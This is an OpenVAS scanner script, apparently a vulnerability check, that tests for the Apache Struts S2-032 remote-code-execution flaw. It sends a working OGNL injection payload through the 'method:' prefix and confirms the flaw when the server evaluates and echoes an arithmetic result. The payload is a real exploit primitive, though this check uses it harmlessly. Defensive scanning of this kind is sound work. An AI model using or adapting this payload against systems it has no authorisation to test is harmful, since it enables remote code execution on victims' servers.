##############################################################################
# OpenVAS Vulnerability Test
# $Id: apache_struts_dmi_rce.nasl 5598 2017-03-17 10:00:43Z teissa $
#Apache Struts Dynamic Method Invocation Remote Code Execution
#
# Authors:
# Tameem Eissa <tameem.eissa@greenbone.net>
#
# Copyright:
# Copyright (c) 2016 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_insight = "Apache Struts Dynamic Method Invocation Bug Lets Remote Users Execute Arbitrary Code on the Target System.";

tag_impact = "Allows unauthorized disclosure of information; Allows unauthorized modification; Allows disruption of service. .";

tag_affected = "Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3).";

tag_summary = "Remote Code Execution can be performed via method: prefix when Dynamic Method Invocation is enabled.";

tag_solution = "Disable Dynamic Method Invocation when possible or upgrade to Apache Struts versions 2.3.20.3, 2.3.24.3 or 2.3.28.1..";

CPE = "cpe:/a:apache:struts";

if (description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.107007");
 script_tag(name:"cvss_base", value:"9.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
 script_version("$Revision: 5598 $");
 script_tag(name:"last_modification", value:"$Date: 2017-03-17 11:00:43 +0100 (Fri, 17 Mar 2017) $");
 script_tag(name:"creation_date", value:"2016-06-01 10:42:39 +0100 (Wed, 01 Jun 2016)");
 script_tag(name:"qod_type", value:"exploit");
 script_name("Apache Struts Dynamic Method Invocation Remote Code Execution");
 script_xref(name:"URL", value:"https://struts.apache.org/docs/s2-032.html");
 script_xref(name:"URL", value:"http://packetstormsecurity.com/files/136856/Apache-Struts-2.3.28-Dynamic-Method-Invocation-Remote-Code-Execution.html");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2016 Greenbone Networks GmbH");
 script_dependencies("gb_apache_struts2_detection.nasl");
 script_require_ports("Services/www", 8080);
 script_mandatory_keys("ApacheStruts/installed");
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "insight" , value : tag_insight);
 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "affected" , value : tag_affected);
 exit(0);
}


include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc");
asport = 0;
buf = "";
dir = "";
url = ""; 
## Get HTTP Port
if(!asport = get_app_port(cpe:CPE)){
  exit(0);
}
url = get_kb_item('ApacheStruts/FoundApp');
if (url == "" || !url){
  exit(0);
}

# Construct the payload 
charset_low="abcdefghijklmnopqrstuvwxyz";
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
numset="1234567890";
v_a = rand_str(length:4, charset:charset_low);
v_b = rand_str(length:4, charset:charset_low);
addend_one = rand() % 9999;
addend_two = rand() % 9999;
sum = addend_one + addend_two;
flag = rand_str(length:5, charset:charset);
postdata = "?method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,"
           +"%23"+v_a+"%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter"
           +"%28%29%2c%23"+v_a
           + ".print%28%23parameters."+v_b+"%5b0%5d%29%2c%23"+v_a
           +".print%28new%20java.lang.Integer%28"+addend_one+"%2b"+addend_two+"%29%29%2c%23"+v_a+".print%28%23parameters."
           +v_b + "%5b0%5d%29%2c%23" + v_a + ".close%28%29,1%3f%23xx%3a%23request.toString&"+ v_b + 
           "=" + flag;
req = http_post( item:url+postdata, port:asport );
buf = http_keepalive_send_recv( port:asport, data:req);
Stringmatch=flag+sum+flag;
# Confirm the exploit
if(buf && buf =~ "HTTP/1\.[0-9]+ 200" && Stringmatch >< buf)
{
      report = report_vuln_url(port:asport, url:url+postdata );
      security_message( port:port, data: report);
      exit(0);
}

exit(0);
